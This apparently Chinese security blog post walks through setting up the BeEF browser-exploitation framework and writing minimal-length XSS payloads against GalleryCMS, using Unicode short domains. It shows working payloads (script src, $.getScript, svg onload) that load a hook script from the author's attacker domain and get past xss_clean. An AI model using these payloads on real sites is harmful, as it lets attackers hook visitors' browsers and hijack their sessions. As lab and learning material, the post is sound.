&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;source ~/.rvm/archives/rvm-1.26.11/scripts/rvm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

然后rvm命令就可以正常运行了

2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，

搜索“df”行，您将找到此代码将：

` __free_space=&#34;$( \command \df &#34;$1&#34; | __rvm_awk &#39;BEGIN{x=4} /Free/{x=3} $3==&#34;Avail&#34;{x=3} END{print $x}&#39; )&#34;`

改为

`__free_space=&#34;999999&#34;`

同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替

3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;ruby_url=https://cache.ruby-china.com/pub/ruby&amp;quot; &amp;gt; /usr/local/rvm/user/db&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后就可以安装 rvm install 2.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

4.提示

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ERROR:  SSL verification error at depth 0: ok (0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Error fetching https://ruby.taobao.org/:&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)

5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)

[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) 

建议使用第二个

注意：下载此版本ruby版本必须&gt;3.0.3

6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`

sudo给对应的文件夹递归加权限即可

7.报错`in autodetect&#39;: Could not find a JavaScript runtime.`

安装nodejs即可 `yum install nodejs`

8.安装bundle install时非常慢，可以更新bundle源

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version&#39;: Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &gt;= 3.8. (RuntimeError)`

解决方法：

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

10.报错

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[14:15:27][!] ERROR: Default username and password in use!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

解决方法：

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim config.yaml   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;更改默认密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)

[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)

但我明显碰到了更多奇奇怪怪的问题

总结：不要再centos上安装beef会变得不幸



### 2.使用45,40，或者20个字符绕过xss长度限制

下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload

### 2.1gallerycms安装

1.报错解决方法：

![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)

1.修改\application\config\database.php中的数据库密码，并且创建对应数据库

2.切换php版本为5.X，因为该CMS使用旧版的CI框架



2.随便注册，登录，此处的Album Name就是注入点

![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)



### 2.2使用短域名绕过字符限制

短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ﬀ expands to `ff`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;℠ expands to `sm`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;㏛ expands to `sr`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ﬆ expands to `st`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;㎭ expands to `rad`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;℡ expands to `tel`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

因此我们就可以使用Unicode编码来缩短域名长度

因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符

最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。

https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names

https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html

后来想起来不止这几个，其实极限域名甚至可以更短。。。



##### 1.没有禁止script标签的情况

使用xsshunt平台：

`&lt;script/src=https://㎭℠.xss.ht&gt;`    

此时该payload为30个字符

使用beef-xss平台

`&lt;script/src=http://㎭℠.co:3000/hook.js&gt;`

此时该payload为30个字符

但注意：src中不加&#34;&#34; 也可以正常解析，同时不加协议也可以正常解析



对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名

注意：国内的域名不支持重定向

![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)





对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符

![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)

此时我们的极限payload为`&lt;script/src=//㎭℠.㎺&gt;`

![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)

此时我们可以在19个长度内完成



##### 2前端框架为jQuery，可以使用如下payload：

不过滤script标签：

注意此payload不能缺少&#34;&#34; ，同样需要把hook.js放到index.html中

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)

过滤script标签

如果没有过滤svg标签。那么此时的payload为：

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)





##### 3.绕过GalleryCMS

对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制

&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;  &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Validate form.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;load-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;helper&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;form&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;load-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;library&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;form_validation&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;form_validation-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;set_error_delimiters&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;div class=&amp;quot;alert alert-error&amp;quot;&amp;gt;&amp;lt;strong&amp;gt;Error: &amp;lt;/strong&amp;gt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;/div&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$user_data&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;session-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;all_userdata&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;form_validation-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;set_rules&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;album_name&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;Album Name&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;trim|required|max_length[45]|xss_clean&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



###### 假设没有xss_clean的绕过

注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了

比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133

![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)

但要是这样我tm白搭了一天的beef...

这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888

我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个



1.payload长度限制为50时

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload 中&amp;quot;&amp;quot; 和后半个闭合标签都不能缺少&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)

2.payload长度限制为40时

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=//㎭℠.co&amp;gt;&amp;#x27;.length&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)



###### 存在xss_clean并且长度限制为45个字符时

利用XSS_clean 漏过滤的svg来绕过

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线

并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的



还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线



补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制



+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)

这个大佬写的文章







### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符

https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/

假設我有個字串是 `ßßßßßßßß&lt;b&gt;1&lt;/b&gt;`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。

在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `&lt;&gt;` 這些字元進去

### 4.利用SVG/details绕过先抓取元素再赋值

document.querySelector( &#39;.note&#39;).innerHTML = text;





## 补充：httponly

&gt; 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。
&gt;
&gt; 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。
&gt;
&gt; 比如，举个简单例子：`&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
&lt;blockquote&gt;
&lt;p&gt;Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png&#34; alt=&#34;image-20221029192451385&#34;&gt;&lt;/p&gt;
&lt;p&gt;Cookie 各个参数详细内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set-Cookie:http 响应头，向客户端发送 Cookie。&lt;/li&gt;
&lt;li&gt;Name=value: 每个 Cookie 必须包含的内容。&lt;/li&gt;
&lt;li&gt;Expires=date:EXpires 确定了 Cookie 的有效终止日期，可选。如果缺省，则 Cookie 不保存在硬盘中，只保存在浏览器内存中。&lt;/li&gt;
&lt;li&gt;Domain=domain-name: 确定了哪些 inernet 域中的 web 服务器可读取浏览器储存的 Cookie，缺省为该 web 服务器域名。&lt;/li&gt;
&lt;li&gt;Path=path: 定义了 web 服务器哪些路径下的页面可获取服务器发送的 Cookie。&lt;/li&gt;
&lt;li&gt;Secure: 在 cookie 中标记该变量，表明只有为 https 通信协议时，浏览器才向服务器提交 Cookie。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Httponly: 禁止 javascript 读取，如果 cookie 中的一个参数带有 httponly，则这个参数将不能被 javascript 获取；httponly 可以防止 xss 会话劫持攻击。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有的网站为了防止 XSS，所以采用浏览器绑定技术，例如将 Cookie 和浏览器的 User-agent 进行绑定，一旦发现绑定不匹配则认为 Cookie 失效，但是这种方法存在很大的弊端，因为当入侵者获取到 Cookie 的同时也能获取到用户的 User-agent; 另一种防止 XSS 获取用户 Cookie 的方式是将 Cookie 和 Remote-addr 相绑定（即与 IP 绑定），但是这样的弊端是可能会带来极差的用户体验，如家里的 ADSL 拨号上网就是每次拨号连接更换一个 IP 地址。&lt;/p&gt;
&lt;p&gt;所以 HttpOnly 就应运而生了。&lt;strong&gt;具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在用户与服务端交互的时候，HttpRequest 包中仍然会带上这个 Cookie 信息，即用户与服务端的正常交互不受影响。如果支持 HttpOnly 的浏览器检测到包含 HttpOnly 标志的 cookie，并且客户端脚本代码尝试读取该 cookie，则浏览器将返回一个空字符串作为结果。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用了 HttpOnly 只是在一定程度上抵御 XSS 盗取 Cookie 的行为，另外 HttpOnly 也不能防止入侵者做 AJAX 提交。严格来说 HttpOnly 并不是为了对抗 XSS，&lt;strong&gt;它解决的是 XSS 后的 Cookie 劫持问题&lt;/strong&gt;，但是 XSS 攻击带来的不仅仅是 Cookie 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列问题。所以除了 HttpOnly 之外还需要其他的对抗解决方案。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;参考&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考&#34;&gt;#&lt;/a&gt; 参考&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAyMjkxMDgyMTE0OTMxMg==&#34;&gt;JavaScript 教程 - 廖雪峰的官方网站 (liaoxuefeng.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93YW5nZG9jLmNvbS9qYXZhc2NyaXB0Lw==&#34;&gt;JavaScript 教程 - 网道 (wangdoc.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==&#34;&gt;JavaScript | MDN (mozilla.org)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=&#34;&gt;介绍 - 《阮一峰 JavaScript 教程》&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==&#34;&gt;research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s&#34;&gt;深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2&#34;&gt;实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=&#34;&gt;https://portswigger.net/research/practical-web-cache-poisoning&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=&#34;&gt;https://xss.by/#cheatsheet&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2wwdWQvcC8xMzE5MDQxMy5odG1s&#34;&gt;XSS 漏洞防御之 HttpOnly - 春告鳥 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
